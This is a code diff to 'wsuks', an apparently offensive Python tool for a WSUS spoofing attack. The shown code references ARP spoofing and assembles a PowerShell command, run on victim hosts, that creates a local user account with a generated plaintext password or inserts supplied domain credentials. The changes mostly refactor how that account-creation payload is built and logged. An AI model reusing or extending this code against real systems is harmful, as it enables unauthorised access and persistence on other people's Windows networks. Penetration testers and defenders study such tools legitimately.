@@ -1,6 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
 from functools import partial
 from http.server import HTTPServer
 import logging
@@ -35,16 +32,16 @@ class Wsuks:
         args.executable.close()
 
         # Set Command
-        if "PREFIX" not in args.command:
+        if "CREATE_USER_COMMAND" not in args.command:
             self.command = args.command
         else:
-            command_prefix = "New-LocalUser -Name WSUKS_USER -Password $(ConvertTo-SecureString WSUKS_PASSWORD -AsPlainText -Force) -Fullname wsuks-user -Description This_user_was_generated_by_the_wsuks_Tool;"
-            if args.username and args.password and args.domain:
-                self.logger.success(f"Using domain user for the WSUS attack: User={colored(args.username, 'green', attrs=['bold'])} Password={colored(args.password, 'green', attrs=['bold'])} Domain={colored(args.domain, 'green', attrs=['bold'])}")
-                self.command = args.command.replace("PREFIX", "").replace("WSUKS_USER", args.domain + "\\" + args.username).replace("WSUKS_PASSWORD", args.password)
+            if args.username and args.domain:
+                self.logger.success(f"Using domain user for the WSUS attack: User={highlight(args.username, 'green')} Password={highlight(args.password, 'green')} Domain={highlight(args.domain, 'green')}")
+                self.command = str(args.command).format(CREATE_USER_COMMAND="", WSUKS_USER=args.domain + "\\" + args.username)
             else:
-                self.logger.success(f"Generated local user for the WSUS attack: Username={colored(self.local_username, 'green', attrs=['bold'])} Password={colored(self.local_password, 'green', attrs=['bold'])}")
-                self.command = args.command.replace("PREFIX", command_prefix).replace("WSUKS_USER", self.local_username).replace("WSUKS_PASSWORD", self.local_password)
+                self.logger.success(f"Generated local user for the WSUS attack: Username={highlight(self.local_username, 'green')} Password={highlight(self.local_password, 'green')}")
+                create_user = f"New-LocalUser -Name {self.local_username} -Password $(ConvertTo-SecureString {self.local_password} -AsPlainText -Force) -Description This_user_was_generated_by_the_wsuks_Tool;\n"
+                self.command = str(args.command).format(CREATE_USER_COMMAND=create_user, WSUKS_USER=self.local_username)
         self.logger.success(f"Command to execute: {self.command}")
 
         self.wsusIp = args.wsusIp
@@ -88,6 +85,10 @@ class Wsuks:
         finally:
             arpspoofer.stop()
             router.stop()
+
+
+def highlight(text, color):
+    return colored(text, color, attrs=['bold'])
 
 
 def main():
